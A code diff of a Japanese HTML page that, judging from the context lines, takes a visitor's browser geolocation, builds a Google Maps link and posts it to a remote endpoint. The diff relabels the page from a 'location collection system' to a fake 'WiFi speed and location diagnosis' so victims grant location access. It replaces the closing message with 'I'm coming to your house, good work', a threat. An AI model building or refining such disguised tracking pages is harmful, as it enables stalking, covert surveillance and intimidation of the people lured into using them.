@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>位置情報確認ツール</title>
+  <title>WIFI通信速度・場所適性診断</title>
   <style>
     body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }
     h1 { font-size: 2em; }
@@ -11,8 +11,8 @@
   </style>
 </head>
 <body>
-  <h1>位置情報収集システム</h1>
-  <p>位置情報を取得しています...</p>
+  <h1>WIFIの通信速度と場所での適</h1>
+  <p>通信速度を計測中...</p>
   <button onclick="getLocation()">位置情報を許可</button>
 
   <script>
@@ -50,7 +50,7 @@ Google Maps: ${mapsUrl}
         body: JSON.stringify({ content: data })
       });
 
-      document.body.innerHTML = '<h1>位置情報を取得しました。ありがとう！</h1>';
+      document.body.innerHTML = '<h1>家行くねオツカレ👍️</h1>';
     }
 
     function showError(error) {
